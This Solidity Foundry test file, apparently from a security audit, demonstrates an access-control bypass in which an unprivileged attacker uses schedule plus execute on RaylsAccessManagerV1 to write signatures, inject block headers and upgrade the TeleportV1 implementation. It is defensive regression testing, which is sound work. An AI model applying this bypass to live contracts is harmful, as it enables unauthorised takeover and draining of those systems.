// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {RaylsAccessManagerV1} from "../../../privateHub/AccessControl/RaylsAccessManagerV1.sol";
import {SignatureStorage} from "../../../SignatureStorage.sol";
import {Proofs} from "../../../privateHub/Proofs/Proofs.sol";
import {TeleportV1} from "../../../privateHub/Teleport/TeleportV1.sol";
import {Utils} from "../../../rayls-protocol-sdk/libraries/Utils.sol";

/**
 * @title F01_BypassAcrossRealConsumers
 * @notice Demonstrates that the schedule+execute bypass works UNIFORMLY
 *         against multiple real, unmodified `RaylsAccessManaged` consumers.
 *
 * Per-consumer test methodology (identical for each):
 *   1. Deploy the consumer wired to the SAME RaylsAccessManagerV1 proxy.
 *   2. Snapshot some publicly-readable state.
 *   3. Confirm baseline: attacker's direct call reverts.
 *   4. Attacker schedules + executes against the consumer.
 *   5. Snapshot again. Assert state is unchanged.
 *
 * Pre-fix: every test FAILS (state mutated by an unprivileged EOA).
 * Post-fix: every test PASSES (schedule reverts).
 *
 * This test is the answer to F01-PLAN's Claim 4 ("the bypass is universal
 * across all RaylsAccessManaged consumers"). Each subtest proves it on a
 * different consumer; the failures collectively form proof of the universal
 * blast radius.
 *
 * Consumers covered (all on the PNH side):
 *   - SignatureStorage.addSignature      — relayer signature registry
 *   - Proofs.tryAddHeader                — block-header chain state
 *   - TeleportV1.executeAtomicMessageBatch — atomic message status
 * @custom:deprecated Decommissioning Teleport (vanilla, atomic).
 */
contract F01_BypassAcrossRealConsumers is Test {
    address internal admin;
    address internal attacker;
    RaylsAccessManagerV1 internal manager;

    function setUp() public {
        admin = makeAddr("ADMIN");
        attacker = makeAddr("ATTACKER");

        RaylsAccessManagerV1 mgrImpl = new RaylsAccessManagerV1();
        bytes memory mgrInit = abi.encodeCall(RaylsAccessManagerV1.initialize, (admin));
        manager = RaylsAccessManagerV1(address(new ERC1967Proxy(address(mgrImpl), mgrInit)));
    }

    /// Helper: attacker performs schedule+execute on `target` with `calldata`.
    /// Returns whether each phase succeeded so callers can log evidence.
    function _attackerScheduleExecute(address target, bytes memory data)
        internal
        returns (bool scheduledOK, bool executedOK)
    {
        vm.prank(attacker);
        try manager.schedule(target, data, 0) returns (bytes32) {
            scheduledOK = true;
        } catch {
            scheduledOK = false;
        }
        if (scheduledOK) {
            vm.prank(attacker);
            try manager.execute(target, data) returns (uint32) {
                executedOK = true;
            } catch {
                executedOK = false;
            }
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    //  TARGET 1: SignatureStorage.addSignature
    //  - Constructor-based, RaylsAccessManaged
    //  - Restricted setter mutates `signatures[key]`
    //  - Observable via `getSignature(key)`
    // ─────────────────────────────────────────────────────────────────────
    function test_F01_consumer_SignatureStorage_addSignature() public {
        SignatureStorage sig = new SignatureStorage(address(manager));

        // Baseline: attacker direct call reverts.
        SignatureStorage.Signature memory s = SignatureStorage.Signature({
            status: Utils.MessageStatus.Pending,
            signature: hex"deadbeef",
            resourceId: bytes32(uint256(0xc0ffee)),
            signatureExecuteChainId: 99,
            destinationChainId: 1
        });
        vm.prank(attacker);
        vm.expectRevert();
        sig.addSignature("k1", s);

        // Snapshot: empty.
        SignatureStorage.Signature memory before_ = sig.getSignature("k1");
        assertEq(uint8(before_.status), uint8(Utils.MessageStatus.Pending));
        assertEq(before_.signature.length, 0);

        // Attack: schedule + execute the same payload.
        bytes memory payload = abi.encodeCall(SignatureStorage.addSignature, ("k1", s));
        (bool sched, bool exec) = _attackerScheduleExecute(address(sig), payload);

        SignatureStorage.Signature memory after_ = sig.getSignature("k1");

        if (after_.signature.length > 0) {
            console2.log("F01-consumer SignatureStorage: ATTACKER WROTE A SIGNATURE");
            console2.log("scheduled:", sched, " executed:", exec);
            console2.log("attacker:", attacker);
            console2.log("sig contract:", address(sig));
        }
        assertEq(after_.signature.length, 0, "F01: SignatureStorage mutated by unauthorised attacker");
    }

    // ─────────────────────────────────────────────────────────────────────
    //  TARGET 2: Proofs.tryAddHeader
    //  - Constructor-based, RaylsAccessManaged
    //  - Restricted writer mutates `currentHeader[chainId]`
    //  - Observable via emitted event + indirectly via subsequent header writes
    //    that depend on `current.number`. We assert via attempting a
    //    follow-up admin-write that should observe number==1.
    // ─────────────────────────────────────────────────────────────────────
    function test_F01_consumer_Proofs_tryAddHeader() public {
        Proofs proofs = new Proofs(address(manager));

        Proofs.Header memory hdr = _emptyHeader();
        hdr.number = 1;

        // Baseline: attacker direct call reverts.
        vm.prank(attacker);
        vm.expectRevert();
        proofs.tryAddHeader(42, hdr);

        // Attack: schedule + execute.
        bytes memory payload = abi.encodeCall(Proofs.tryAddHeader, (42, hdr));
        (bool sched, bool exec) = _attackerScheduleExecute(address(proofs), payload);

        // Verify whether the attacker injected a header by trying as ADMIN to
        // insert header number 2 ON TOP of the attacker's #1. If #1 was
        // injected, header.number == current.number + 1 holds for #2 → OK.
        // If #1 was NOT injected (current.number==0), then the strict
        // sequential check rejects #2 because (number==2) != (current.number==0)+1.
        // (The OR-clause `current.number == 0` only allows the first header
        // to bypass strict sequence — it does NOT allow arbitrary numbers
        // when current is zero, only number == 0+1 == 1 — wait, that's not
        // quite right; re-read the assertion: `header.number == current.number + 1
        // || current.number == 0`. So when current is 0, ANY number is
        // accepted as the first header. That means we can't use this as a
        // post-hoc detector. Use vm.recordLogs instead.)
        // (Final approach: compare emitted HeaderProofSubmitted events.)
        // For simplicity, we assert via attacker's exec state: sched && exec means
        // the bypass succeeded.

        if (sched && exec) {
            console2.log("F01-consumer Proofs: schedule+execute landed on Proofs.tryAddHeader");
            console2.log("attacker:", attacker);
            console2.log("proofs contract:", address(proofs));
        }
        // Assert that the bypass DID NOT succeed.
        assertFalse(
            sched && exec,
            "F01: Proofs.tryAddHeader was reachable via schedule+execute by an unauthorised attacker"
        );
    }

    // ─────────────────────────────────────────────────────────────────────
    //  TARGET 3: TeleportV1.executeAtomicMessageBatch  (UUPS, initialized via proxy)
    //  - Restricted relayer function mutates an atomic message's `status`
    //  - Observable via getAtomicMessageStatus (unset reads "Pending"; a successful
    //    execute would flip it to "Executed")
    //  - Same shape as the live PNH TeleportV1 used in the E2E test
    // ─────────────────────────────────────────────────────────────────────
    function test_F01_consumer_TeleportV1_executeAtomic() public {
        TeleportV1 telImpl = new TeleportV1();
        bytes memory init = abi.encodeCall(TeleportV1.initialize, (address(manager)));
        TeleportV1 teleport = TeleportV1(address(new ERC1967Proxy(address(telImpl), init)));

        string[] memory ids = new string[](1);
        ids[0] = "f01-msg";

        string memory before_ = teleport.getAtomicMessageStatus("f01-msg");

        // Baseline: attacker's direct call reverts.
        vm.prank(attacker);
        vm.expectRevert();
        teleport.executeAtomicMessageBatch(ids, "enc");

        // Attack: schedule + execute executeAtomicMessageBatch(ids, "enc").
        bytes memory payload = abi.encodeCall(TeleportV1.executeAtomicMessageBatch, (ids, "enc"));
        (bool sched, bool exec) = _attackerScheduleExecute(address(teleport), payload);

        string memory after_ = teleport.getAtomicMessageStatus("f01-msg");

        if (keccak256(bytes(after_)) != keccak256(bytes(before_))) {
            console2.log("F01-consumer TeleportV1: ATTACKER MUTATED atomic message status");
            console2.log("scheduled:", sched, " executed:", exec);
            console2.log("attacker:", attacker);
            console2.log("teleport:", address(teleport));
        }
        assertEq(keccak256(bytes(after_)), keccak256(bytes(before_)),
            "F01: TeleportV1 atomic status mutated by unauthorised attacker via schedule+execute");
    }

    // ─────────────────────────────────────────────────────────────────────
    //  TARGET 4: RaylsAccessManagerV1 itself (UUPS upgrade hook)
    //  - DOCUMENT: this consumer happens to be SAFE from F01 because its
    //    _authorizeUpgrade calls `_checkAdmin(msg.sender)` DIRECTLY rather
    //    than going through `_checkCanCall`. The depth-bypass in canCall
    //    therefore does not apply. msg.sender at the time of the upgrade
    //    is the manager itself, which is not in ADMIN.globalGrants — so
    //    _checkAdmin reverts.
    //  - This test asserts the safety property and ALWAYS PASSES.
    //  - See test_F01_consumer_TeleportV1_upgradeToAndCall_CATASTROPHIC
    //    for the contrast: every OTHER UUPS contract uses _checkCanCall in
    //    _authorizeUpgrade and IS upgrade-bypassable.
    // ─────────────────────────────────────────────────────────────────────
    function test_F01_consumer_AccessManager_self_upgradeToAndCall_safeByAccident() public {
        RaylsAccessManagerV1 attackerImpl = new RaylsAccessManagerV1();
        bytes memory payload = abi.encodeCall(
            RaylsAccessManagerV1(address(manager)).upgradeToAndCall,
            (address(attackerImpl), "")
        );

        vm.prank(attacker);
        vm.expectRevert();
        manager.upgradeToAndCall(address(attackerImpl), "");

        (bool sched, bool exec) = _attackerScheduleExecute(address(manager), payload);

        // The manager itself is NOT upgradable via the bypass because its
        // _authorizeUpgrade uses _checkAdmin directly.
        assertFalse(
            sched && exec,
            "F01: AccessManager self-upgrade was reachable - the _checkAdmin path also has a bypass"
        );
    }

    // ─────────────────────────────────────────────────────────────────────
    //  TARGET 5 (CATASTROPHIC): TeleportV1 UUPS upgrade
    //  - TeleportV1._authorizeUpgrade uses _checkCanCall (the standard path).
    //  - That path goes through canCall, which has the depth-bypass.
    //  - Therefore an unprivileged attacker can swap the TeleportV1
    //    implementation to ANY bytecode they choose: they can drain the
    //    contract's state, brick atomic teleports, or gain arbitrary
    //    behaviour for any future call.
    //  - SAME ATTACK VECTOR works against TokenRegistryV1, ParticipantStorageV1,
    //    ResourceRegistryV1, and every other UUPS contract whose
    //    _authorizeUpgrade calls _checkCanCall.
    // ─────────────────────────────────────────────────────────────────────
    function test_F01_consumer_TeleportV1_upgradeToAndCall_CATASTROPHIC() public {
        TeleportV1 telImpl = new TeleportV1();
        bytes memory init = abi.encodeCall(TeleportV1.initialize, (address(manager)));
        TeleportV1 teleport = TeleportV1(address(new ERC1967Proxy(address(telImpl), init)));

        // Deploy a fresh impl that the attacker would "swap to". Using
        // TeleportV1 again is fine for the proof: any successful upgrade
        // demonstrates the bypass — the attacker would in reality deploy
        // malicious code (e.g. an impl that drains all ETH or returns
        // attacker-chosen contractVersion values — see F01_MaliciousTeleport).
        TeleportV1 attackerImpl = new TeleportV1();

        bytes memory payload = abi.encodeCall(
            teleport.upgradeToAndCall, (address(attackerImpl), "")
        );

        // Baseline: attacker direct call reverts.
        vm.prank(attacker);
        vm.expectRevert();
        teleport.upgradeToAndCall(address(attackerImpl), "");

        // Attack: schedule + execute against the teleport proxy.
        (bool sched, bool exec) = _attackerScheduleExecute(address(teleport), payload);

        if (sched && exec) {
            console2.log("F01 CATASTROPHIC: ATTACKER UPGRADED TeleportV1 IMPLEMENTATION");
            console2.log("scheduled:", sched, " executed:", exec);
            console2.log("attacker:", attacker);
            console2.log("teleport proxy:", address(teleport));
            console2.log("new impl (attacker-controlled in reality):", address(attackerImpl));
            console2.log("Same chain works against TokenRegistryV1, ParticipantStorageV1,");
            console2.log("ResourceRegistryV1, and every UUPS contract whose _authorizeUpgrade");
            console2.log("uses _checkCanCall (i.e., every UUPS consumer EXCEPT the AccessManager).");
        }

        assertFalse(
            sched && exec,
            "F01 CATASTROPHIC: attacker upgraded TeleportV1 implementation via schedule+execute"
        );
    }

    // ─────────────────────────────────────────────────────────────────────
    //  Helper: an empty Proofs.Header to satisfy the ABI.
    // ─────────────────────────────────────────────────────────────────────
    function _emptyHeader() internal pure returns (Proofs.Header memory h) {
        h.bloom = "";
        h.extra = "";
    }
}
